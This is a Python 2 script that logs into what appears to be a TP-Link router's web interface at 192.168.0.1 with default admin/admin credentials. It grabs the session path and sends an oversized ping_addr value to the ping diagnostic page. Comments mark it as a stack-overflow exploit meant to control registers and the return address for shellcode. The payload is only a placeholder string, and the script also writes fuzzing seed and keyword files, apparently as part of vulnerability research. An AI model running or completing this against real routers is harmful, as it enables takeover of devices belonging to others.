import urllib2
import urllib
import base64
import hashlib
import os



def login(ip, user, pwd):
	hash = hashlib.md5()
	hash.update(pwd)
	auth_string = "%s:%s" %(user, hash.hexdigest())
	encoded_string = base64.b64encode(auth_string)
	print "[debug] Encoded authorisation: %s" %encoded_string#### Send the request
	url = "http://" + ip + "/userRpm/LoginRpm.htm?Save=Save"
	req = urllib2.Request(url)
	req.add_header('Cookie', 'Authorization=Basic %s' %encoded_string)
	resp = urllib2.urlopen(req)#### The server generates a random path for further requests, grab that here
	data = resp.read()
	next_url = "http://%s/%s/userRpm/" %(ip, data.split("=")[2].split("/")[3])
	print "[debug] Got random path for next stage, url is now %s" %next_url
	return (next_url, encoded_string)

def exploit_normal(url, auth):
	#trash,control of s0,s1   +     ra  +   shellcode
	evil = "zyw"*8
	#evil ="zywzywzyw"*80
	params = {'ping_addr': evil, 'doType': 'ping', 'isNew': 'new', 'sendNum': '20', 'pSize': '64', 'overTime': '800', 'trHops': '20'}

	new_url = url + "PingIframeRpm.htm?" + urllib.urlencode(params)

	req = urllib2.Request(new_url)
	req.add_header('Cookie', 'Authorization=Basic %s' %auth)
	req.add_header('Referer', url + "DiagnosticRpm.htm")

	resp = urllib2.urlopen(req)

def exploit(url, auth):
	#trash,control of s0,s1   +     ra  +   shellcode
	#evil = "\x41"*8
	evil = "zyw"*8
	#evil ="zywzywzyw"*80
	params = {'ping_addr': evil, 'doType': 'ping', 'isNew': 'new', 'sendNum': '20', 'pSize': '64', 'overTime': '800', 'trHops': '20'}

	new_url = url + "PingIframeRpm.htm?" + urllib.urlencode(params)

	req = urllib2.Request(new_url)
	req.add_header('Cookie', 'Authorization=Basic %s' %auth)
	req.add_header('Referer', url + "DiagnosticRpm.htm")
	#req.add_header('Accept-Encoding', "zyw"*1000);
	resp = urllib2.urlopen(req)

if __name__ == '__main__':
	
	login("192.168.0.1", "admin", "admin")
	data = login("192.168.0.1", "admin", "admin")

	strstr = data[0].split("/")

	#buf="GET /%s/userRpm/PingIframeRpm.htm?sendNum=20&isNew=new&doType=ping&pSize=64" %strstr[3]
	#buf+="&overTime=800&trHops=20&ping_addr="+"zyw"*240+" HTTP/1.1\r\n"

	buf="GET /%s/userRpm/PingIframeRpm.htm?" %strstr[3]
	buf+="ping_addr="+"zyw"*8+" HTTP/1.1\r\n" #do_Type=xxx will make it crash, donnot figure out why
	buf+="Accept-Encoding: identity\r\n"
	buf+="Cookie: Authorization=Basic %s\r\n" %data[1]
	buf+="Host: 192.168.0.1\r\n"
	buf+="Referer: http://192.168.0.1/ZRCEHZIAKHSFSLKB/userRpm/DiagnosticRpm.htm\r\n" #%strstr[3]
	buf+="Connection: close\r\n"
	buf+="User-Agent: Python-urllib/2.7\r\n\r\n"
	
	fp1 = open("inputs/seed", "w+")
	fp1.write(buf)
	fp1.close()

	os.system("cp keywords_105600_ori keywords_105600")
	fp2 = open("keywords_105600", "a+")
	fp2.write("\nhttp_str=\"/"+strstr[3]+"/userRpm/PingIframeRpm.htm\"")
	fp2.write("\nhttp_str2=\""+data[1]+"\"")
	fp2.write("\nhttp_str3=\"doType=\"")
	fp2.write("\nhttp_str4=\"ping_addr=\"")
	fp2.close()

	exploit(data[0], data[1])
